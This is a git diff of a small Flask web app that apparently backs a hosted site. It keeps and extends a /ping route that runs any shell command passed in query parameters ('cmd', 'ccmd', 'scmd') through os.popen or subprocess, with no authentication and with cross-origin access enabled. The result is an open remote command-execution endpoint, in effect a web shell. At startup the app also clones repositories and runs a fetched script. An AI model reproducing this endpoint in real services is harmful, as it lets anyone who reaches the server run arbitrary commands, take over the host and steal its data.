@@ -1,7 +1,7 @@
 from flask import Flask, jsonify, request
 from flask_cors import CORS
 
-import re,os,subprocess,importlib
+import re,os,subprocess,importlib,shlex
 
 app = Flask(__name__)
 CORS(app, origins=[
@@ -14,6 +14,7 @@ CORS(app, origins=[
 try:
  print(f'{subprocess.run(["git","clone","https://github.com/minhinc/static"],capture_output=True,text=True)=}')
  print(f'{subprocess.run(["git","clone","https://github.com/minhinc/apps"],capture_output=True,text=True)=}')
+ print(f'{subprocess.run(["apps/misc/fetchfile.py","*"],capture_output=True,text=True)=}')
 except Exception as e:
  print(f'subprocess running command failed {e=}')
 
@@ -23,11 +24,9 @@ handleri=apps.handler.handlerc()
 @app.route("/ping")
 def ping():
  if not request.args:
-  return "<p>ping</p>"
- elif 'cmd' in request.args:
-  return re.sub(r'\n','<br>',os.popen(f'{request.args["cmd"]}').read(),flags=re.DOTALL)
- elif 'fetch' in request.args:
-  return 'fetch no action'
+  return "h1>ping</h1>"
+ elif [x for x in request.args if re.search(r'^[cs]?cmd$',x)]:
+  return re.sub(r'\n','<br>',os.popen(f'{request.args["ccmd"]}').read() if 'ccmd' in request.args else subprocess.run(shlex.split(request.args['cmd' if 'cmd' in request.args else 'scmd']),capture_output=True,text=True).stdout,flags=re.DOTALL)
  elif 'reload' in request.args:
   global handleri
   try:
@@ -36,6 +35,7 @@ def ping():
   except Exception as e:
    return f'reload Exception {e=}'
   return "success"
+ return "<h1>unknown request<h1>"
 
 @app.route("/", defaults={"path": ""})
 @app.route("/<path:path>", methods=["GET", "POST"])
@@ -54,6 +54,7 @@ def data(path):
  tdict['request']=request
  tdict['path']=path
  tdict['local']=False if re.search(r'minhinc\.onrender\.com',tdict['renderurl'],flags=re.I) else True
+ tdict['staticdir']='/static' if tdict['local'] else 'https://minhinc.github.io/static'
 
  print(f'<=> app.py data {(handleri.staticurl,handleri.renderurl)=} {tdict=}')
 
